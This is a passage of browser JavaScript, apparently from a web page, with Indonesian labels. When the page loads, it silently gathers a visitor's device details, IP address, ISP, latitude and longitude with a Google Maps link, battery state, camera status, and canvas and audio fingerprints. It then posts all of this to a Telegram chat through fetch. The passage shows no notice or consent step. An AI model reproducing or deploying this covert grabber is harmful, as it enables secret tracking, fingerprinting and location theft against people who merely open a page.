• *Layar Sentuh*: ${deviceInfo.touchscreen}

🌐 *Jaringan*
• *Status Online*: ${deviceInfo.onlineStatus}
• *Tipe Jaringan*: ${deviceInfo.networkType}
• *Tipe Koneksi*: ${deviceInfo.connectionType}
• *Kecepatan Unduh*: ${deviceInfo.downlinkSpeed}
• *Latensi (RTT)*: ${deviceInfo.rtt}

📍 *Lokasi*
• *IP Address*: ${deviceInfo.ipAddress}
• *ISP*: ${deviceInfo.isp}
• *ASN*: ${deviceInfo.asn}
• *Lokasi*: ${deviceInfo.locationInfo}
• *Latitude*: ${deviceInfo.latitude}
• *Longitude*: ${deviceInfo.longitude}
• *Google Maps*: ${deviceInfo.googleMapsLink}

🔋 *Baterai*
• ${deviceInfo.batteryInfo}

🕒 *Waktu*
• *Waktu Lokal*: ${deviceInfo.localTime}
• *Zona Waktu*: ${deviceInfo.timezone}
• *Waktu Aktif Perangkat*: ${deviceInfo.deviceUptime}

🔧 *Hardware*
• *Jumlah Core CPU*: ${deviceInfo.hardwareConcurrency}
• *Arsitektur CPU*: ${deviceInfo.cpuArchitecture}
• *Memori Perangkat*: ${deviceInfo.deviceMemory}
• *GPU*: ${deviceInfo.gpu}

💾 *Penyimpanan*
• *Local Storage*: ${deviceInfo.localStorageSize}
• *Session Storage*: ${deviceInfo.sessionStorageSize}
• *IndexedDB*: ${deviceInfo.indexedDBSupport}

🔍 *Browser*
• *Cookie*: ${deviceInfo.cookieEnabled}
• *Mode Gelap*: ${deviceInfo.darkMode}
• *Do Not Track*: ${deviceInfo.doNotTrack}
• *Plugin*: ${deviceInfo.plugins}
• *AdBlocker*: ${deviceInfo.adBlockerStatus}
• *Kamera*: ${deviceInfo.cameraStatus}
• *Tema Sistem*: ${deviceInfo.systemTheme}

⚙️ *Fitur Tambahan*
• *WebGL*: ${deviceInfo.webGLSupport}
• *WebRTC*: ${deviceInfo.webRTCSupport}
• *Canvas Fingerprint*: ${deviceInfo.canvasFingerprint.slice(0, 50)}...
• *Audio Fingerprint*: ${deviceInfo.audioFingerprint}

📅 _Laporan dibuat pada ${new Date().toLocaleString("id-ID")}_
🌐 *by domain*: idnetconnect.biz.id
`;

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        formData.append('parse_mode', 'Markdown');

        fetch(url, {
            method: 'POST',
            body: formData
        })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Informasi perangkat berhasil dikirim ke Telegram.');
                } else {
                    console.error('Gagal mengirim informasi perangkat ke Telegram:', data);
                }
            })
            .catch(error => {
                console.error('Error mengirim ke Telegram:', error);
            });
    }
}

function calculateStorageSize(storage) {
    try {
        let total = 0;
        for (let key in storage) {
            if (storage.hasOwnProperty(key)) {
                total += (storage[key].length + key.length) * 2;
            }
        }
        return (total / 1024).toFixed(2) + " KB";
    } catch (error) {
        return "Tidak dapat dihitung";
    }
}

function detectBrowser() {
    const userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.includes('chrome') && !userAgent.includes('edg')) return 'Google Chrome';
    if (userAgent.includes('firefox')) return 'Mozilla Firefox';
    if (userAgent.includes('safari') && !userAgent.includes('chrome')) return 'Apple Safari';
    if (userAgent.includes('edg')) return 'Microsoft Edge';
    if (userAgent.includes('opera') || userAgent.includes('opr')) return 'Opera';
    return 'Browser tidak dikenal';
}

function detectOS() {
    const platform = navigator.platform.toLowerCase();
    const userAgent = navigator.userAgent.toLowerCase();
    if (platform.includes('win')) return 'Windows';
    if (platform.includes('mac')) return 'MacOS';
    if (platform.includes('linux')) return 'Linux';
    if (userAgent.includes('android')) return 'Android';
    if (/iphone|ipad|ipod/.test(userAgent)) return 'iOS';
    return 'Sistem operasi tidak dikenal';
}

function detectGPU() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Tidak diketahui";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Tidak diketahui";
    } catch (error) {
        return "Tidak diketahui";
    }
}

document.addEventListener('DOMContentLoaded', () => {
    detectDeviceInfoAndSendToTelegram();
});
